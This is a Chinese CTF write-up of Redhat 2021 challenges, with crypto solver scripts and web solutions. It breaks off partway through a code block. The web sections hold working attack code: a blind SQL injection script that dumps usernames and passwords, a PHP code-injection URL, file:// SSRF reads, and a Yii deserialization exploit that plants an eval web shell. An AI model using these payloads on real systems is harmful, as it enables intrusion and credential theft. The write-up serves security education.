    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg"></p><span id="more"></span><h2 id="1-签到-EBC"><a href="#1-签到-EBC" class="headerlink" title="1 签到 EBC"></a>1 签到 EBC</h2><p>下载文件发现该文件为EBC编码 使用kali自带工具iconv解码得到flag</p><p>Flag{we1c0me_t0_redhat2021}</p><p><code>iconv -f EBCDIC-IT -t utf-8 redhat/EBCDIC.txt</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510182155.png"></p><h2 id="2-密码学-hpcurve"><a href="#2-密码学-hpcurve" class="headerlink" title="2 密码学-hpcurve"></a>2 密码学-hpcurve</h2><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">K = GF(p)</span><br><span class="line">R.&lt;x&gt; = K[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_u_from_out</span>(<span class="params">output, known_input</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        res.append(output[i]^^known_input[i])</span><br><span class="line">    res = <span class="built_in">bytes</span>(res)</span><br><span class="line">    u0, u1, u2 = struct.unpack(<span class="string">&quot;&lt;QQQ&quot;</span>, res)</span><br><span class="line">    u = x^<span class="number">3</span>+x^<span class="number">2</span>*u2+x*u1+u0</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v_from_u</span>(<span class="params">u</span>):</span></span><br><span class="line">    Kbar = GF(p^<span class="number">6</span>)</span><br><span class="line">    Rbar.&lt;t&gt; = Kbar[<span class="string">&quot;t&quot;</span>]</span><br><span class="line">    u2 = u.change_ring(Rbar)</span><br><span class="line">    roots = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> u2.roots()]</span><br><span class="line">    ys = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        ys.append(f(root).sqrt(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)])</span><br><span class="line">        <span class="keyword">if</span> poly[<span class="number">0</span>] <span class="keyword">in</span> K:</span><br><span class="line">            res.append(R(poly))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_decode</span>(<span class="params">output, u, v</span>):</span></span><br><span class="line">    rs = [u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>]]</span><br><span class="line">    otp = struct.pack(<span class="string">&quot;&lt;QQQQQQ&quot;</span>, *rs)</span><br><span class="line">    plain = []</span><br><span class="line">    otp = otp*<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        plain.append(output[i]^^otp[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&quot;</span>)</span><br><span class="line">known_input = <span class="string">b&quot;aaaaaaaaaaaaaaaaaaaaflag&quot;</span></span><br><span class="line">u = get_u_from_out(output, known_input)</span><br><span class="line">vs = get_v_from_u(u)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> vs:</span><br><span class="line"><span class="built_in">print</span>(try_decode(output,u,v))</span><br></pre></td></tr></table></figure><p>在线运行sage代码</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510182858.png"></p><h2 id="3-密码学-primegame"><a href="#3-密码学-primegame" class="headerlink" title="3 密码学-primegame"></a>3 密码学-primegame</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">exp.py:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="built_in">int</span>(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">100</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    keys.append(Decimal(<span class="built_in">int</span>(primes[i])).ln())</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">    arr.append(<span class="built_in">int</span>(v * <span class="built_in">int</span>(<span class="number">16</span>) ** <span class="built_in">int</span>(<span class="number">64</span>)))</span><br><span class="line"><span class="comment"># ct = 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span></span><br><span class="line">ct = <span class="number">425985475047781336789963300910446852783032712598571885345660550546372063410589918</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">res</span>):</span></span><br><span class="line">    h = Decimal(<span class="built_in">int</span>(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keys)):</span><br><span class="line">        h += res[i] * keys[i]</span><br><span class="line"></span><br><span class="line">    ct = <span class="built_in">int</span>(h * <span class="built_in">int</span>(<span class="number">16</span>)**<span class="built_in">int</span>(<span class="number">64</span>))</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">N</span>):</span></span><br><span class="line">    ln = <span class="built_in">len</span>(arr)</span><br><span class="line">    A = Matrix(ZZ, ln + <span class="number">1</span>, ln + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ln):</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">        A[i, ln] = arr[i] // N</span><br><span class="line">        A[ln, i] = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    A[ln, ln] = ct // N</span><br><span class="line"></span><br><span class="line">    res = A.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ln + <span class="number">1</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ln):</span><br><span class="line">            <span class="keyword">if</span> -<span class="number">64</span> &lt;= res[i][j] &lt; <span class="number">64</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            vec = [<span class="built_in">int</span>(v + <span class="number">64</span>) <span class="keyword">for</span> v <span class="keyword">in</span> res[i][:-<span class="number">1</span>]]</span><br><span class="line">            ret = encrypt(vec)</span><br><span class="line">            <span class="keyword">if</span> ret == ct:</span><br><span class="line">                <span class="built_in">print</span>(N, <span class="built_in">bytes</span>(vec))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>, ret, <span class="built_in">bytes</span>(vec))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    f(i)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510183036.png"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210510183057260.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="meta">... </span> flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">&#x27;flag&#123;715c39c3-1b46-4c23-\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="meta">... </span> flag += <span class="built_in">chr</span>(i)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">&#x27;8006-27b43eba2446&#125;\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">flag&#123;715c39c3-1b46-4c23-<span class="number">8006</span>-27b43eba2446&#125;</span><br></pre></td></tr></table></figure><h2 id="4-web-web-find-it"><a href="#4-web-web-find-it" class="headerlink" title="4 web-web find it"></a>4 web-web find it</h2><p>通过<code>code</code>直接写入<code>phpinfo()</code></p><p><code>http://eci-2zeg1tmyhxfbmpmn6585.cloudeci1.ichunqiu.com:80/?code=&lt;?php phpinfo();?&gt;</code></p><p>请求<code>hack.php</code> <code>find</code>搜索发现<code>flag</code></p><p><code>flag&#123;f21c9e0c-b8a0-4191-8e69-3580273b9e91&#125;</code></p><p>本想这道题需要写入shell完成命令执行，真没想到直接搜索，真是好题</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510183315.png"></p><h2 id="5-web-注入"><a href="#5-web-注入" class="headerlink" title="5 web-注入"></a>5 web-注入</h2><p>注入脚本bool.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s.get(url, headers=header).text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judgeLength</span>(<span class="params">baseUrl, payload, resLength</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        url = baseUrl + urllib.parse.quote(payload % <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s.get(url, headers=header).text) == resLength:</span><br><span class="line">            <span class="built_in">print</span>((<span class="string">&quot;&gt;&quot;</span> * <span class="number">3</span>) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;@&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judgeString</span>(<span class="params">baseUrl, payload, length, resLength</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">            url = baseUrl + urllib.parse.quote(payload % (<span class="built_in">str</span>(i), <span class="built_in">str</span>(<span class="built_in">ord</span>(c))))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(s.get(url, headers=header).text) == resLength:</span><br><span class="line">                result += c</span><br><span class="line">                <span class="built_in">print</span>((<span class="string">&quot;&gt;&quot;</span> * <span class="number">3</span>) + <span class="string">&quot; &quot;</span> + result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabase</span>(<span class="params">url, resLength</span>):</span></span><br><span class="line">    payload1 = <span class="string">&quot;&amp;&amp;length(database())=%s&quot;</span></span><br><span class="line">    length = judgeLength(url, payload1, resLength)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&quot;&amp;&amp;ascii(substr(database(),%s,1))=%s&quot;</span></span><br><span class="line">    judgeString(url, payload2, <span class="built_in">int</span>(length), resLength)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTables</span>(<span class="params">url, resLength</span>):</span></span><br><span class="line">    payload1 = <span class="string">&quot;&amp;&amp;length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))=%s&quot;</span></span><br><span class="line">    length = judgeLength(url, payload1, resLength)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&quot;&amp;&amp;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),%s,1))=%s&quot;</span></span><br><span class="line">    judgeString(url, payload2, <span class="built_in">int</span>(length), resLength)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumns</span>(<span class="params">url, resLength</span>):</span></span><br><span class="line">    payload1 = <span class="string">&quot;&amp;&amp;length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273))=%s&quot;</span></span><br><span class="line">    length = judgeLength(url, payload1, resLength)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&quot;&amp;&amp;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&amp;&amp;table_name=0x7573657273),%s,1))=%s&quot;</span></span><br><span class="line">    judgeString(url, payload2, <span class="built_in">int</span>(length), resLength)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span>(<span class="params">url, resLength</span>):</span></span><br><span class="line">    payload1 = <span class="string">&quot;&amp;&amp;length((select/**/group_concat(username,password)/**/from/**/users))=%s&quot;</span></span><br><span class="line">    length = judgeLength(url, payload1, resLength)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&quot;&amp;&amp;ascii(substr((select/**/group_concat(username,password)/**/from/**/users),%s,1))=%s&quot;</span></span><br><span class="line">    judgeString(url, payload2, <span class="built_in">int</span>(length), resLength)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://eci-2zefc95c45rh9xwew99q.cloudeci1.ichunqiu.com:80/image.php?id=1&quot;</span></span><br><span class="line">    length = getLength(url)</span><br><span class="line">    <span class="comment"># getUser(url, length)</span></span><br><span class="line">    <span class="comment"># getDatabase(url, length)</span></span><br><span class="line">    <span class="comment"># getTables(url, length) ## images,users</span></span><br><span class="line">    <span class="comment"># getColumns(url, length) ## username,password</span></span><br><span class="line">    getResult(url, length) <span class="comment">## admin xxx可能会不一样de </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取用户名密码</p><p>admin f7ba3a53d25a376074e36</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/28bd3ee632d3ec66a6014b0bb9a6385.png"></p><p>直接登录后台跳转至modify.php 该页面存在ssrf 直接读文件直接获取flag</p><p>file:///flag</p><p>file:///flag</p><p>TMD竞赛有非预期解  我不相信出题人故意干的 用御剑可以直接扫描出modify.php 且可以未授权访问 GG</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/3ca87d2fdf7ad822fb50ee2a3d1af21.png"></p><h2 id="6-web-framework"><a href="#6-web-framework" class="headerlink" title="6 web-framework"></a>6 web-framework</h2><p>御剑扫描去<a href="http://www.zip源码包审计发现是一个yii框架,/">www.zip源码包审计发现是一个yii框架，</a> 然后在网站找到YII的cve漏洞的playload（<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%AE%E6%94%B9playload%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%BC%96%E5%86%99exp%E4%BB%A3%E7%A0%81">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943），然后修改playload代码，编写exp代码</a></p><p>EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">base</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">View</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;eval($_REQUEST[&quot;cmd&quot;])&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line">    <span class="variable">$a</span>-&gt;checkAccess = <span class="keyword">array</span>(<span class="keyword">new</span> yii\base\View(),<span class="string">&quot;evaluateDynamicContent&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> yii\db\BatchQueryResult));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 然后写入shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 